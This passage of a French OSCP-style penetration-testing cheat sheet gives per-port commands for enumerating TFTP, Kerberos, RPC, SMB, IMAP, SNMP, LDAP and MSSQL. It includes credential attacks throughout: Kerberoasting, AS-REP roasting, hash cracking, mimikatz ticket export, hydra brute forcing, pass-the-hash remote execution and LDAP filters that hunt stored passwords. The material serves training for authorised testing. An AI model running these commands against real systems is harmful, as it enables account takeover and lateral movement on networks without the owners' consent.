while IFS= read -r fichier; do [ -n "$fichier" ] && tftp 192.0.2.10 -c get "$fichier"; done < liste_fichiers.txt

```

<p class="oscp-command-note">TFTP : transmettre get ou put à l'invite interactive via stdin ; vérifier le client installé.</p>

```bash
printf 'get fichier_distant fichier_local\nquit\n' | tftp 192.0.2.10
printf 'put fichier_local fichier_distant\nquit\n' | tftp 192.0.2.10

```

### 88: Kerberos

Examiner les objets, les droits et les services du domaine.

<p class="oscp-command-note">Kerberos : identifier TCP 88 ; krb5-enum-users nécessite une liste de noms et le domaine cible.</p>

```bash
# Identifier le service Kerberos sur TCP 88 ; UDP 88 peut également être utilisé
nmap -sV -p 88 <IP_CIBLE>

# Tester l'énumération d'utilisateurs uniquement dans le périmètre autorisé ; nécessite un domaine et des noms candidats
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=EXEMPLE.LOCAL,userdb=utilisateurs.txt <IP_CIBLE>

```

<p class="oscp-command-note">Kerbrute : tester l'existence des noms d'utilisateurs du fichier contre le contrôleur de domaine autorisé.</p>

```bash
kerbrute userenum --dc <IP_DC> -d <DOMAINE> liste_utilisateurs.txt
# Variante si le binaire a été téléchargé localement
./kerbrute_linux_amd64 userenum --dc <IP_DC> -d <DOMAINE> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

```

<p class="oscp-command-note">AS-REP roasting : demander les réponses pour les comptes sans préauthentification du domaine autorisé.</p>

```bash
impacket-GetNPUsers -dc-ip <IP_DC> -request -usersfile liste_utilisateurs.txt <DOMAINE>/

```

<p class="oscp-command-note">Impacket getTGT : demander un TGT avec un compte du domaine et un mot de passe autorisés.</p>

```bash
impacket-getTGT -dc-ip <IP_DC> <DOMAINE>/<UTILISATEUR>

```

<p class="oscp-command-note">Tester hors ligne des empreintes Kerberos avec John ; Hashcat -m 13100 concerne uniquement les TGS RC4-HMAC.</p>

```bash
john --wordlist=liste_mots_de_passe.txt tickets.hash
# Pour les tickets TGS Kerberos de type 23 (RC4-HMAC) uniquement
hashcat -m 13100 tickets_tgs.hash liste_mots_de_passe.txt

```

<p class="oscp-command-note">Kerberos : distinguer TGT (getTGT) et ticket de service SPN (getST) avec des identifiants autorisés.</p>

```bash
# Demander un TGT Kerberos avec des identifiants autorisés
impacket-getTGT -dc-ip <IP_DC> <DOMAINE>/<UTILISATEUR>

# Demander un ticket de service pour un SPN existant avec des identifiants autorisés
impacket-getST -dc-ip <IP_DC> -spn <SERVICE>/<HOTE> <DOMAINE>/<UTILISATEUR>

```

<p class="oscp-command-note">Impacket GetUserSPNs : demander des TGS pour les comptes de service accessibles ; cracking hors ligne ensuite.</p>

```bash
# Demander les TGS des SPN accessibles et enregistrer leurs empreintes pour une analyse hors ligne
impacket-GetUserSPNs -dc-ip <dc_ip> -outputfile <tickets_file> <domain>/<username>:<password>

# Tester hors ligne les empreintes de tickets avec John ou Hashcat selon leur type
john --wordlist=<wordlist> <tickets_file>
# Ou
hashcat -m 13100 <tickets_file> <wordlist>

```

```bash
# Vérifier les identifiants Kerberos
krb5-brute -d <domain> -t <target_ip> -u <username> -p <password_list>

```

<p class="oscp-command-note">Impacket : demander un TGT avec un compte autorisé ; les exemples Rubeus ci-dessous étaient incorrects.</p>

```bash
# Obtenir un TGT avec un compte autorisé (ceci n'est pas un renouvellement)
impacket-getTGT -dc-ip 192.0.2.10 exemple.local/utilisateur

# Vérifier la syntaxe exacte de Rubeus dans son aide avant tout test.
# /rc4 attend une empreinte RC4, pas un mot de passe en clair.

```

<p class="oscp-command-note">Mimikatz : exporter les tickets Kerberos accessibles en mémoire ; nécessite des privilèges élevés.</p>

```powershell
# Exporter les tickets accessibles avec les droits nécessaires (commande sensible)
mimikatz "sekurlsa::tickets /export"

```

<p class="oscp-command-note">Kerbrute : tester une liste de noms sur le contrôleur de domaine spécifié, sans mot de passe.</p>

```bash
# Énumérer les utilisateurs Kerberos autorisés avec le binaire Kerbrute
kerbrute userenum --dc 192.0.2.10 -d exemple.local utilisateurs.txt

```

<p class="oscp-command-note">Windows : consulter les tickets Kerberos du compte courant sans en créer ni en importer.</p>

```powershell
klist

```

<p class="oscp-command-note">Linux : demander un TGT Kerberos avec Impacket et un compte de laboratoire.</p>

```bash
impacket-getTGT -dc-ip 192.0.2.10 exemple.local/utilisateur

```

<p class="oscp-command-note">Windows : afficher les tickets Kerberos actuellement présents dans le cache avec klist tickets.</p>

```powershell
klist tickets

```

<p class="oscp-command-note">Kerberos : les anciennes commandes de dump et de tickets forgés ont été retirées ; contrôler d'abord l'état du cache de tickets local.</p>

```bash
# Vérifier les tickets locaux avec les outils du système

klist

```

### 110: POP3

<p class="oscp-command-note">Nmap POP3 : identifier les capacités du service et les informations NTLM éventuellement exposées.</p>

```bash
nmap -sV -p 110 --script pop3-capabilities,pop3-ntlm-info <IP_CIBLE>

```

<p class="oscp-command-note">POP3 : ouvrir une session Telnet sur le port 110 puis saisir les commandes POP3 dans la session (sans chiffrement).</p>

```text
# Ouvrir une connexion POP3 de test sur TCP 110
telnet <IP_CIBLE> 110

# Authentifier le compte de test (identifiants transmis en clair)
USER <UTILISATEUR>
PASS <MOT_DE_PASSE>

# Lister les numéros et tailles des messages après authentification
LIST

# Lire le premier message de la boîte de test après authentification
RETR 1

```

<p class="oscp-command-note">Hydra POP3 : tester un compte de laboratoire sur TCP 110 ou POP3S sur TCP 995 avec TLS implicite.</p>

```bash
# Tester des identifiants POP3 dans un laboratoire autorisé
hydra -l <username> -P <password_list> -f <target_ip> pop3 -V

# Tester POP3S sur le port 995 (TLS implicite) dans le périmètre autorisé
hydra -S -v -l <username> -P <password_list> -s 995 -f <target_ip> pop3 -V

```

<p class="oscp-command-note">POP3 : second exemple interactif avec fermeture propre via QUIT.</p>

```text
# Ouvrir une connexion au service POP3 non chiffré
telnet <target_ip> 110

# Saisir les identifiants de laboratoire dans la session POP3
USER <username>
PASS <password>

# Lister les messages disponibles après authentification
LIST

# Récupérer un message par son numéro (à saisir dans la session POP3)
RETR <NUMERO_MESSAGE>

# Fermer la connexion
QUIT

```

### 111: RPC

<p class="oscp-command-note">Nmap RPC : lister les programmes RPC exposés via le script rpcinfo sur TCP 111.</p>

```bash
nmap -sV -p 111 --script rpcinfo <IP_CIBLE>

```

```bash
# Interroger le service rpcbind et afficher les programmes RPC enregistrés
rpcinfo -p <IP_CIBLE>

```

<p class="oscp-command-note">NFS : demander à mountd la liste des exports publiés ; un refus est possible.</p>

```bash
# Afficher les exports NFS annoncés par le serveur mountd (si accessible)
showmount -e <IP_CIBLE>

```

### 135, 593: MSRPC

<p class="oscp-command-note">Nmap MSRPC : identifier le service sur TCP 135 ; aucun script NSE n'est exécuté ici.</p>

```bash
nmap -sV -p 135 <IP_CIBLE>

```

**Paramètres et repères :**
`rpcdump`  

```bash
# Lister les points de terminaison RPC via Impacket (outil installé requis)
impacket-rpcdump <IP_CIBLE> -port 135

```

```bash
# Identifier le service RPC sur HTTP (TCP 593)
nmap -sV -p 593 <IP_CIBLE>

```

**Paramètres et repères :**
`rpcclient`  

<p class="oscp-command-note">rpcclient : ouvrir une session SMB/RPC et interroger les informations accessibles sans identifiants.</p>

```bash
# Tenter une session RPC sans identifiants (peut être refusée)
rpcclient -U '' -N <IP_CIBLE>

# Afficher les informations serveur via srvinfo ; ne liste pas toutes les commandes
rpcclient -U '' -N <IP_CIBLE> -c 'srvinfo'

# Énumérer les comptes du domaine visibles par cette session
rpcclient -U '' -N <IP_CIBLE> -c 'enumdomusers'

# Énumérer les groupes du domaine accessibles à cette session
rpcclient -U '' -N <IP_CIBLE> -c 'enumdomgroups'

# Énumérer les utilisateurs avec un compte de domaine autorisé
rpcclient -U 'utilisateur' -W 'EXEMPLE' 192.0.2.10 -c 'enumdomusers'

```

**Paramètres et repères :**
`rpcclient`  

<p class="oscp-command-note">rpcclient : commandes interactives de lecture uniquement ; saisir ces lignes après connexion, pas dans Bash.</p>

```text
enumdomusers
enumdomgroups
queryuser 0x450
enumprinters
querydominfo
# lookupnames et lookupsids exigent respectivement un nom et un SID
lookupnames utilisateur
lookupsids S-1-5-18
# Informations sur le rôle du domaine
dsroledominfo
dsenumdomtrusts

```

```text
# Dans l'invite interactive rpcclient : lister les utilisateurs du domaine
enumdomusers

# Interroger un utilisateur par son RID hexadécimal
queryuser 0x450

# Afficher les RID des groupes associés à cet utilisateur
queryusergroups 0x450

# Résoudre un nom de compte en SID
lookupnames utilisateur

# Obtenir les alias associés à un utilisateur (selon les commandes prises en charge)
queryuseraliases domain S-1-5-21-111111111-222222222-333333333-1000

```

<p class="oscp-command-note">Dans rpcclient : énumérer les groupes, consulter un RID puis lister ses membres.</p>

```text
# Dans l'invite rpcclient : lister les groupes
enumdomgroups

# Obtenir les détails du groupe
querygroup 0x200

# Lister les membres du groupe identifié par son RID
querygroupmem 0x200

```

```text
# Dans l'invite rpcclient : lister les alias
enumalsgroups builtin

# Lister les membres d'un alias
queryaliasmem builtin 0x220

```

```text
# Dans l'invite rpcclient : lister les domaines visibles
enumdomains

# Interroger le SID et les informations de politique du domaine
lsaquery

# Obtenir des informations de domaine
querydominfo

```

<p class="oscp-command-note">SMB : identifier le service, tester des identifiants autorisés avec NetExec et résoudre les SID avec Impacket ; aucun script smb-brute n'est exécuté.</p>

```bash
# Nmap : vérifier la présence du service SMB
nmap -sV -p 445 192.0.2.10

# NetExec (nxc) : vérifier des identifiants de laboratoire ; attention aux verrouillages de comptes
nxc smb 192.0.2.10 -u admin -p mots_de_passe.txt
# Autre possibilité
nxc smb 192.0.2.10 -u utilisateurs.txt -p 'MotDePasseTest'

# Énumérer les SID/RID via Impacket avec un compte de laboratoire autorisé
impacket-lookupsid 'exemple.local/utilisateur@192.0.2.10'

```

<p class="oscp-command-note">rpcclient interactif : résoudre des noms et SID, ou énumérer les SID LSA accessibles.</p>

```text
# Dans l'invite rpcclient : résoudre un nom de compte en SID
lookupnames utilisateur

# Énumérer les SID accessibles à la session RPC
lsaenumsid

# Résoudre un SID connu (ne lance pas de balayage RID)
lookupsids S-1-5-21-111111111-222222222-333333333-500

```

**Paramètres et repères :**
`rpcclient`  

<p class="oscp-command-note">rpcclient : consulter les informations du domaine avec un compte autorisé ou tenter une session anonyme.</p>

```bash
rpcclient -U 'administrateur' 192.0.2.10 -c 'querydominfo'
# Autre possibilité
rpcclient -U '' -N 192.0.2.10 -c 'enumdomusers'

```

**Paramètres et repères :**
`setuserinfo` · `rpcclient` · `level` · `setuserinfo2`  

### 139, 445: SMB

Examiner les objets, les droits et les services du domaine.

<p class="oscp-command-note">SMB : contrôler TCP 139/445 avec Nmap ; nbtscan fonctionne sous Linux, net view sous Windows CMD.</p>

```bash
# Scanner les ports et services avec Nmap
nmap -sV -p 139,445 <IP_CIBLE>
nmap -p 139,445 --script smb-os-discovery <IP_CIBLE>

# Analyser les services NetBIOS
sudo nbtscan -r 192.168.50.0/24

# Windows CMD : afficher les ressources partagées d'un serveur
net view \\\\192.0.2.10 /all

```

<p class="oscp-command-note">Nmap SMB : énumérer partages, comptes, groupes et protocoles ; tester MS17-010 uniquement dans le périmètre autorisé.</p>

```bash
nmap -p 445 --script smb-enum-shares <IP_CIBLE>

nmap -p 445 --script smb-enum-users <IP_CIBLE>

nmap -p 445 --script smb-enum-domains,smb-enum-groups,smb-enum-shares,smb-enum-users <IP_CIBLE>

nmap -p 445 --script smb-vuln-ms17-010 192.0.2.10

nmap -p 445 --script smb-security-mode,smb2-security-mode 192.0.2.10

nmap -p 445 --script smb-protocols 192.0.2.10

```

<p class="oscp-command-note">SMB : capturer le trafic TCP 139 avec ngrep et lister les partages accessibles sans mot de passe.</p>

```bash
# Capturer le trafic TCP 139 avec ngrep ; ne décode pas les opérations SMB
sudo ngrep -d eth0 '' 'tcp port 139'

# Lister les partages SMB accessibles sans mot de passe
smbclient -L //<IP_CIBLE> -N

```

**Paramètres et repères :**
`smbmap`  

<p class="oscp-command-note">SMBMap : comparer les droits visibles en accès anonyme ou invité ; -R explore les répertoires autorisés.</p>

```bash
smbmap -H <IP_CIBLE>
smbmap -u '' -p '' -H <IP_CIBLE>
smbmap -u 'guest' -p '' -H <IP_CIBLE>
smbmap -u '' -p '' -H <IP_CIBLE> -R

```

<p class="oscp-command-note">Interroger SMB avec NetExec (`nxc`), successeur de CrackMapExec ; les essais de comptes doivent être autorisés.</p>

```bash
nxc smb 192.0.2.10
nxc smb 192.0.2.10 -u '' -p ''
nxc smb 192.0.2.10 -u guest -p ''
nxc smb 192.0.2.10 -u guest -p '' --shares
nxc smb 192.0.2.10 -u guest -p '' --rid-brute
nxc smb 192.0.2.10 -u utilisateur -p 'MotDePasseTest'

```

<p class="oscp-command-note">Enum4linux : inventorier les comptes, partages et informations NetBIOS visibles selon les permissions de la session.</p>

```bash
# Énumérer les informations SMB/NetBIOS accessibles avec enum4linux
enum4linux -a <IP_CIBLE>
enum4linux -a -u "" -p "" <IP> && enum4linux -a -u "guest" -p "" <IP>

# Énumérer les utilisateurs accessibles via RPC/SMB
enum4linux -U <IP_DC>

# Lister les partages SMB annoncés par la cible
enum4linux -S <IP_CIBLE>

enum4linux -a 192.0.2.10 2>&1
enum4linux -a -u "" -p "" <ip>
enum4linux -a -u "guest" -p "" <ip>
enum4linux -a -u "[user]" -p "[password]" <ip>

```

```bash
# Depuis Kali : lister les partages SMB ; -N évite la demande interactive de mot de passe
smbclient --no-pass -L //<IP_CIBLE>
smbclient -L //192.0.2.10 -U utilisateur
smbclient //192.0.2.10/partage
smbclient -N //192.0.2.10/partage
smbclient //192.0.2.10/partage -U utilisateur -t 100 -c 'prompt;recurse;mget *'

# Dans la session smbclient, help affiche les commandes interactives disponibles
help
# Exemple dans le terminal Linux, hors de l'invite smbclient : smbclient -t 100 -L //192.0.2.10 -N

# Dans smbclient, basculer les confirmations et la récursion (commandes sans ON/OFF)
prompt
recurse
mget *

```

<p class="oscp-command-note">SMB : essais d'identifiants autorisés avec NetExec ou Hydra ; limiter le débit et surveiller les verrouillages.</p>

```bash
nxc smb 192.0.2.10 -u utilisateurs.txt -p mots_de_passe.txt
hydra -L utilisateurs.txt -P mots_de_passe.txt smb://192.0.2.10 -f

```

<p class="oscp-command-note">Linux : créer un point de montage puis monter un partage SMB en lecture seule avec cifs-utils et les droits sudo.</p>

```bash
# Monter un partage SMB autorisé dans un répertoire local (installer cifs-utils)
mkdir -p /tmp/share
sudo mount -t cifs //192.0.2.10/partage /tmp/share -o guest,ro
sudo mount -t cifs //192.0.2.10/partage /tmp/share -o username=utilisateur,ro

```

<p class="oscp-command-note">Impacket : PsExec, WMIExec, SMBExec et ATExec sont des méthodes distinctes d'exécution distante nécessitant les droits adaptés.</p>

```bash
# Impacket PsExec : selon l'installation, utiliser impacket-psexec ou psexec.py
psexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
psexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>

# Impacket WMIExec : exécution distante via WMI ; vérifier les privilèges et le pare-feu
wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
wmiexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>

# Impacket SMBExec : exécution distante via SMB ; les permissions d'administration sont généralement nécessaires
smbexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
smbexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>

# Impacket ATExec : exécution via le planificateur de tâches distant ; une commande à exécuter est obligatoire
atexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP> <COMMAND>
atexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH> whoami

```

```bash
# Identifiants
psexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>

# Pass-the-Hash
psexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>

# Vérification avec NetExec (nxc)
nxc smb 192.0.2.10 -u utilisateur -p 'MotDePasseTest'
nxc smb 192.0.2.10 -u utilisateur -H '0123456789abcdef0123456789abcdef'

```

<p class="oscp-command-note">Impacket WMIExec : exemples d'authentification par mot de passe ou empreinte NTLM, puis vérification via NetExec.</p>

```bash
# Identifiants
wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>

# Pass-the-Hash
wmiexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>

# Vérification avec NetExec (nxc)
nxc smb 192.0.2.10 -u utilisateur -p 'MotDePasseTest' --exec-method wmiexec -x 'whoami'
nxc smb 192.0.2.10 -u utilisateur -H '0123456789abcdef0123456789abcdef' --exec-method wmiexec -x 'whoami'

```

#### Découverte des partages sans mot de passe

Tester l'énumération anonyme et noter un refus d'accès comme un résultat normal.

<p class="oscp-command-note">SMB : tenter de lister les partages anonymement ; un accès refusé ne signifie pas que SMB est absent.</p>

```bash
smbclient -L //<IP_CIBLE> -N
enum4linux-ng -A <IP_CIBLE>
```

#### Partages accessibles avec un compte de test

Lister uniquement les ressources visibles pour le compte fourni dans le périmètre.

<p class="oscp-command-note">NetExec SMB : afficher les partages visibles par un compte de test avec --shares.</p>

```bash
nxc smb <IP_CIBLE> -u '<UTILISATEUR>' -p '<MOT_DE_PASSE>' --shares
```

### 143, 993: IMAP

<p class="oscp-command-note">Nmap IMAP : identifier les services 143/993 et relever les informations NTLM si elles sont exposées.</p>

```bash
nmap -sV -p 143,993 --script imap-ntlm-info <IP_CIBLE>

```

<p class="oscp-command-note">IMAPS : examiner la négociation TLS et le certificat du service sur TCP 993.</p>

```bash
openssl s_client -connect 192.0.2.10:993

```

<p class="oscp-command-note">SearchSploit : rechercher des références d'exploits IMAP, sans conclure à une vulnérabilité exploitable.</p>

```bash
searchsploit imap

```

<p class="oscp-command-note">Lancer le script Python check_imap.py défini ci-dessous pour afficher les capacités IMAP annoncées.</p>

```bash
# Exemple : relever les capacités IMAP sans authentification
python3 check_imap.py 192.0.2.10 143

```

<p class="oscp-command-note">Script Python 3 utilisant imaplib : connexion IMAP/IMAPS, affichage des capacités et fermeture de session.</p>

```python
import imaplib
import sys

def check_imap_capabilities(host, port):
    if port == 993:
        mail = imaplib.IMAP4_SSL(host, port=port, timeout=10)
    else:
        mail = imaplib.IMAP4(host, port=port, timeout=10)
    
    print(mail.capabilities)
    mail.logout()

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Utilisation : python3 check_imap.py <hôte> <port>")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    
    check_imap_capabilities(host, port)

```

#### Bannière IMAP et TLS

Examiner le certificat d'un service IMAPS sans tenter d'authentification.

<p class="oscp-command-note">IMAPS : afficher le certificat et un résumé de la négociation TLS sur TCP 993.</p>

```bash
openssl s_client -connect <IP_CIBLE>:993 -servername <NOM_DNS> -brief
```

### 161 (UDP): SNMP

<p class="oscp-command-note">SNMP UDP 161 : repérer les hôtes, relever les informations SNMP et tester les communautés autorisées.</p>

```bash
sudo nmap -sU --open -p 161 <RESEAU_CIDR> -oG open-snmp.txt

sudo nmap -sU -p 161 --script 'snmp-info,snmp-sysdescr' <IP_CIBLE>

sudo nmap -sU -p 161 --script snmp-brute --script-args snmp-brute.communitiesdb=communautes.txt <IP_CIBLE>

```

<p class="oscp-command-note">SNMPv2c : parcourir les OID accessibles avec une communauté autorisée ; trafic non chiffré.</p>

```bash
# Versions SNMP : v1, v2c et v3 (SNMPv3 utilise une authentification différente)
# Exemples historiques de communautés SNMPv1/v2c : public et private ; ne pas présumer qu'elles fonctionnent
snmpwalk -v2c -c <COMMUNAUTE> <IP_CIBLE> .1

```

<p class="oscp-command-note">Énumérer SNMP avec une communauté autorisée et examiner les résultats.</p>

```bash
# Dictionnaire SNMP : vérifier la présence de SecLists dans /usr/share/seclists/Discovery/SNMP/ avant usage

# Tester des chaînes de communauté SNMP dans le laboratoire
onesixtyone -c communautes.txt <IP_CIBLE>

# Interroger les objets SNMP accessibles ; ajouter un OID numérique pour limiter la recherche
snmpwalk -v2c -c <COMMUNAUTE> <IP_CIBLE>

# SNMPv2c : parcourir les objets par lots avec GETBULK (si pris en charge par l'agent)
snmpbulkwalk -v2c -c <COMMUNAUTE> <IP_CIBLE>

# Afficher un inventaire SNMP avec snmp-check ; la communauté par défaut peut échouer
snmp-check <IP_CIBLE>

```

**Paramètres et repères :**
`onesixtyone`  

<p class="oscp-command-note">Créer les fichiers locaux de communautés et d'adresses IP, puis les fournir à onesixtyone pour tester SNMP/UDP 161.</p>

```bash
printf '%s\n' public private monitoring > communautes.txt

for hote in $(seq 1 254); do printf '192.0.2.%s\n' "$hote"; done > adresses.txt

onesixtyone -c communautes.txt -i adresses.txt

```

<p class="oscp-command-note">Lire les sorties NET-SNMP-EXTEND-MIB exposées par l'agent SNMP, si cette MIB est disponible.</p>

```bash
snmpwalk -v2c -c <COMMUNAUTE> <IP_CIBLE> NET-SNMP-EXTEND-MIB::nsExtendOutputFull

```

```bash
# Parcourir la branche system avec la communauté de test public, uniquement si autorisée
snmpwalk -v2c -c public 192.0.2.10 1.3.6.1.2.1.1

```

<p class="oscp-command-note">OID SNMP courants : les objets accessibles dépendent de la MIB, de l'agent et des droits.</p>

```text
1.3.6.1.2.1.25.1.6.0 --> Nombre de processus
1.3.6.1.4.1.77.1.2.25 --> Comptes utilisateurs (MIB Windows, si exposée)
1.3.6.1.2.1.6.13.1.3 --> Ports TCP locaux
1.3.6.1.2.1.25.4.2.1.2 --> Noms des processus
1.3.6.1.2.1.25.4.2.1.4 --> Chemins des exécutables
1.3.6.1.2.1.25.2.3.1.4 --> Unités d'allocation du stockage
1.3.6.1.2.1.25.6.3.1.2 --> Noms des logiciels installés

```

#### Information système via SNMP

Interroger l'OID system sur une instance SNMPv2c avec la communauté d'audit autorisée.

<p class="oscp-command-note">SNMP : parcourir la branche system (1.3.6.1.2.1.1) pour relever description, nom et disponibilité de l'agent.</p>

```bash
snmpwalk -v2c -c '<COMMUNAUTE>' <IP_CIBLE> 1.3.6.1.2.1.1
```

#### Services et interfaces SNMP

Lire les descriptions d'interface. Attention : SNMPv2c ne chiffre pas le trafic.

<p class="oscp-command-note">SNMP : afficher les descriptions des interfaces réseau via ifDescr (1.3.6.1.2.1.2.2.1.2).</p>

```bash
snmpwalk -v2c -c '<COMMUNAUTE>' <IP_CIBLE> 1.3.6.1.2.1.2.2.1.2
```

#### SNMP-Check : inventaire du service

Sur Kali, la commande s'appelle `snmp-check` avec un tiret, même si les notes consultées écrivent `snmpcheck`. Elle utilise la communauté indiquée et ne nécessite pas d'écriture sur l'équipement. [Référence Kali](https://www.kali.org/tools/snmpcheck/).

<p class="oscp-command-note">snmp-check : produire un inventaire avec une communauté SNMP autorisée ; un refus peut indiquer des droits insuffisants.</p>

```bash
snmp-check <IP_CIBLE> -c <COMMUNAUTE>
```

#### SNMP : informations système HOST-RESOURCES-MIB

Interroger les noms de processus déclarés par l'agent. Les données dépendent du MIB et des droits de la communauté.

<p class="oscp-command-note">SNMP : lire hrSWRunName pour les noms de processus exposés par HOST-RESOURCES-MIB.</p>

```bash
snmpwalk -v2c -c '<COMMUNAUTE>' <IP_CIBLE> 1.3.6.1.2.1.25.4.2.1.2
```

### 389, 636, 3268 & 3269: LDAP

Examiner les objets, les droits et les services du domaine.

<p class="oscp-command-note">Nmap LDAP : lire RootDSE avec le script ldap-rootdse sur TCP 389/636 ; ne lance pas tous les scripts ldap*.</p>

```bash
nmap -n -sV -p 389,636 --script ldap-rootdse <IP_DC>

```

<p class="oscp-command-note">LDAP : lire RootDSE puis rechercher des objets sous le DN de base autorisé ; -W demande le mot de passe.</p>

```bash
# LDAP : lire namingContexts dans RootDSE sans authentification si le serveur le permet
ldapsearch -LLL -x -H ldap://192.0.2.10 -s base -b '' namingContexts

# Interroger le RootDSE : base DN vide et portée base
ldapsearch -x -H ldap://<IP_DC> -s base -b ''

# Afficher les contextes de nommage publiés par le serveur LDAP
ldapsearch -x -H ldap://<IP_DC> -s base -b '' namingContexts

# LDAP : rechercher les objets visibles sous le DN de base explicite
ldapsearch -x -H ldap://<target_ip> -b "DC=<domain>,DC=<tld>"

# Rechercher tous les objets LDAP visibles (le filtre objectClass=* ne se limite pas aux utilisateurs)
ldapsearch -v -x -b "DC=<domain>,DC=<tld>" -H "ldap://<target_ip>" "(objectclass=*)"

# Lister les attributs sAMAccountName des objets utilisateur visibles
ldapsearch -LLL -x -H ldap://<IP_DC> -b 'DC=exemple,DC=local' '(objectClass=user)' sAMAccountName

# LDAP : distinguer les filtres utilisateur et groupe
ldapsearch -x -H ldap://<target_ip> -b "DC=<domain>,DC=<tld>" "(objectclass=user)"
ldapsearch -x -H ldap://<target_ip> -b "DC=<domain>,DC=<tld>" "(objectclass=group)"

# LDAP : -D accepte l'identité de connexion ; -W demande le mot de passe sans l'inscrire dans l'historique
ldapsearch -x -H ldap://<IP_DC> -D 'utilisateur@exemple.local' -W -b 'DC=exemple,DC=local' '(objectClass=*)'

# Recherche LDAP authentifiée : fournir un filtre valide et demander le mot de passe de façon interactive.
ldapsearch -x -H ldap://192.0.2.10 -D 'utilisateur@exemple.local' -W -b 'DC=exemple,DC=local' '(objectClass=user)'

# Sélectionner explicitement un attribut retourné après le filtre LDAP.
ldapsearch -x -H ldap://192.0.2.10 -D 'utilisateur@exemple.local' -W -b 'DC=exemple,DC=local' '(objectClass=user)' sAMAccountName

```

<p class="oscp-command-note">Kerbrute : tester les noms d'utilisateurs fournis sur le contrôleur de domaine autorisé.</p>

```bash
kerbrute userenum -d <domain> --dc <dc_ip> <userlist>

```

<p class="oscp-command-note">Filtres LDAP à insérer dans ldapsearch : ces expressions ne s’exécutent pas dans Bash.</p>

```text
# Filtres LDAP : certains attributs peuvent contenir des informations sensibles ; respecter les droits d'accès
# Rechercher ms-MCS-AdmPwd (mots de passe de l'administrateur local)
(ms-MCS-AdmPwd=*)

# Rechercher les attributs contenant 'password' dans la description
(description=*password*)

# Rechercher le délai d'expiration de LAPS (pour identifier la gestion de mot de passe potentielle)
(ms-MCS-AdmPwdExpirationTime=*)

# Rechercher séparément une sous-chaîne dans description ; le filtre LDAP n'accepte pas une alternance de type regex
(|(description=*123456*)(description=*password*)(description=*qwerty*)(description=*letmein*))

# Filtres de recherche LDAP courants
# Rechercher les objets de classe user (peut inclure des ordinateurs dans Active Directory)
(objectClass=user)

# Rechercher les objets de classe computer dans l'annuaire
(objectClass=computer)

# Rechercher les objets de classe group dans l'annuaire
(objectClass=group)

# Rechercher les comptes désactivés (Disabled Accounts)
(userAccountControl:1.2.840.113556.1.4.803:=2)

# Rechercher les comptes utilisateurs actifs dont pwdLastSet n'est pas égal à zéro (ne garantit pas la validité du mot de passe)
(&(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(!(pwdLastSet=0)))

# Rechercher les membres d’un groupe (Group Membership)
(&(objectClass=user)(memberOf=CN=GroupName,OU=Groups,DC=domain,DC=com))

# Rechercher des utilisateurs avec des attributs spécifiques
# Pour les utilisateurs ayant un domaine de messagerie spécifique
(mail=*@example.com)
# Pour les utilisateurs ayant un titre spécifique
(title=Manager)

# Recherche par attribut LDAP

# Recherche du dernier jeu de mots de passe
(pwdLastSet=*)

# Rechercher les comptes dont l'attribut pwdLastSet vaut exactement zéro
(&(objectClass=user)(pwdLastSet=0))

# Recherche de comptes dans une unité organisationnelle spécifique (OU)
(distinguishedName=*,OU=Sales,DC=domain,DC=com)

# Recherches liées à la sécurité

# Identifier les comptes dont le bit DONT_REQ_PREAUTH est défini dans userAccountControl
(userAccountControl:1.2.840.113556.1.4.803:=4194304)

# Rechercher les objets qui possèdent au moins un servicePrincipalName (SPN)
(servicePrincipalName=*)

# Recherche d'utilisateurs délégués
(msDS-AllowedToDelegateTo=*)

# Rechercher des comptes avec des privilèges
(memberOf=CN=Domain Admins,CN=Users,DC=domain,DC=com)

# Autres recherches LDAP utiles

# Rechercher toutes les unités organisationnelles
(objectClass=organizationalUnit)

# Rechercher les objets de classe cACertificate ; ce filtre seul n'inventorie pas les autorités AD CS
(objectClass=cACertificate)

# Rechercher tous les attributs d'un utilisateur spécifique
(sAMAccountName=username)

# Rechercher les comptes selon leur description
(description=*keyword*)

# Rechercher tous les objets dans le répertoire
(objectClass=*)

# Rechercher les objets de catégorie serviceAccount si le schéma LDAP la prend en charge
(objectCategory=serviceAccount)

# Rechercher les comptes membres du groupe indiqué (GroupName)
(memberOf=CN=GroupName,OU=Groups,DC=domain,DC=com)

# Rechercher les comptes d’ordinateur
(objectClass=computer)

# Pour limiter la recherche à une OU, utiliser -b 'OU=Users,DC=domain,DC=com' dans ldapsearch.
# Le filtre (ou=...) recherche une valeur d'attribut, pas un DN complet.

# Rechercher tous les comptes avec des attributs spécifiques
(pwdLastSet=0)

```

#### Base de l'annuaire LDAP

Interroger RootDSE pour trouver les contextes de nommage, puis utiliser le DN de base approprié.

<p class="oscp-command-note">LDAP RootDSE : afficher defaultNamingContext et namingContexts pour identifier le DN de base.</p>

```bash
ldapsearch -LLL -x -H ldap://<IP_DC> -s base -b '' defaultNamingContext namingContexts
```

#### Objets utilisateurs du domaine

Lister le nom des comptes exposés à un utilisateur LDAP autorisé.

<p class="oscp-command-note">LDAP authentifié : lire sAMAccountName des objets user accessibles ; le filtre peut aussi inclure des comptes ordinateurs AD.</p>

```bash
ldapsearch -LLL -x -H ldap://<IP_DC> -D '<DN_COMPTE>' -W -b '<DN_BASE>' '(&(objectCategory=person)(objectClass=user))' sAMAccountName
```

### 1433: MSSQL

Examiner les connexions, la configuration et les requêtes de la base de données.

<p class="oscp-command-note">Nmap MSSQL : identifier le service SQL Server et les informations NTLM exposées sans exécuter de commande SQL.</p>

```bash
nmap -sV -p 1433 --script ms-sql-info,ms-sql-ntlm-info 192.0.2.10

# Identifier la version et les informations MSSQL sans scripts d'exécution ni extraction de secrets
